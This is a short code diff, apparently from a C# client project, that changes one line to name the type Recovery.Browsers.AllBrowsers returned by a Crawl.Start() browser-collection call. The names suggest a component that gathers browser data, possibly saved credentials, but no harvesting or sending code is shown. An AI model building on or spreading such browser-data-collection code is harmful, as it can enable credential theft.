@@ -83,7 +83,7 @@ namespace Pulsar.Client.Messages
             //    }
             //}
 
-            List<AllBrowsers> browsers = Crawl.Start();
+            List<Recovery.Browsers.AllBrowsers> browsers = Crawl.Start();
 
             foreach (var browser in browsers)
             {
